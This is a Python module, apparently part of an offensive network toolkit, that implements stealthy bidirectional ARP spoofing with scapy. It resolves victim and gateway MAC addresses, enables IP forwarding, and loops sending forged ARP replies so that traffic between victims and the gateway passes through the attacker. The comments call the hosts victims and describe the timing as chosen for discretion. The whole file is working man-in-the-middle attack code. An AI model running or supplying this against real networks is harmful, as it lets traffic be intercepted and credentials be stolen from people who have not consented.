"""
modules/arp_spoof.py
Moteur ARP Spoofing Bi-directionnel & Silencieux.
Redirige le trafic : Victime -> Attaquant -> Gateway (et inversement).
Gère l'IP Forwarding automatiquement via core.mitigation.
"""
import time
import threading
from scapy.all import send, ARP, Ether, srp
from core.logger import log
from core.config import conf
from core.mitigation import SystemControl

class ARPSpoofer:
    def __init__(self, targets: list[str]):
        self.targets = targets
        self.gateway_ip = conf.gateway_ip
        self.gateway_mac = conf.gateway_mac
        self.interface = conf.interface
        self.running = False
        self._lock = threading.Lock()
        self.spoof_thread = None

    def _resolve_mac(self, ip: str) -> str:
        """Résolution MAC robuste (Cache ou ARP Who-has)."""
        # On pourrait utiliser conf.scanned_hosts si dispo, mais on assure ici :
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            log.warning(f"Échec résolution MAC pour {ip}: {e}")
        return None

    def _spoof_loop(self):
        log.info(f"Initialisation ARP Spoofing sur {len(self.targets)} cibles...")

        # 1. Vérification Gateway
        if not self.gateway_mac:
            self.gateway_mac = self._resolve_mac(self.gateway_ip)
            if not self.gateway_mac:
                log.error(f"FATAL: Impossible de trouver la MAC du Gateway ({self.gateway_ip}).")
                self.running = False
                return

        # 2. Résolution des victimes
        victim_map = {} # {ip: mac}
        for ip in self.targets:
            mac = self._resolve_mac(ip)
            if mac:
                victim_map[ip] = mac
            else:
                log.warning(f"Victime {ip} inaccessible. Ignorée.")

        if not victim_map:
            log.error("Aucune victime valide. Arrêt.")
            self.running = False
            return

        # 3. Activation IP Forwarding (Vital)
        SystemControl.set_ip_forwarding(True)
        log.success(f"MITM Actif : {len(victim_map)} victimes <-> Attaquant <-> Gateway")

        # 4. Boucle d'empoisonnement
        while self.running:
            for vip, vmac in victim_map.items():
                try:
                    # Empoisonner la victime (Gateway est à mon adresse MAC)
                    # op=2 (is-at)
                    pkt_v = ARP(op=2, pdst=vip, hwdst=vmac, psrc=self.gateway_ip)
                    send(pkt_v, verbose=False, iface=self.interface)

                    # Empoisonner le Gateway (Victime est à mon adresse MAC)
                    pkt_g = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=vip)
                    send(pkt_g, verbose=False, iface=self.interface)
                except Exception:
                    pass
            
            # Pause pour ne pas flooder le réseau (discrétion)
            time.sleep(2.0)

    def start(self):
        """Lance le spoofing dans un thread séparé."""
        if self.running:
            return
        self.running = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.spoof_thread.start()

    def stop(self):
        """Arrête le spoofing et restaure le réseau."""
        if not self.running:
            return
        self.running = False
        log.info("Arrêt ARP Spoofing en cours...")
        
        if self.spoof_thread and self.spoof_thread.is_alive():
            self.spoof_thread.join(timeout=3.0)

        # Restauration propre via mitigation
        SystemControl.set_ip_forwarding(False)
        
        # On tente de restaurer les tables ARP des victimes
        for vip in self.targets:
            # Note: idéalement on stocke les macs résolues pour restaurer parfaitement
            # Ici on fait un restore générique via mitigation qui re-calculera si besoin
            vmac = self._resolve_mac(vip) 
            if vmac and self.gateway_mac:
                SystemControl.restore_arp(vip, self.gateway_ip, vmac, self.gateway_mac)

        log.success("Réseau restauré.")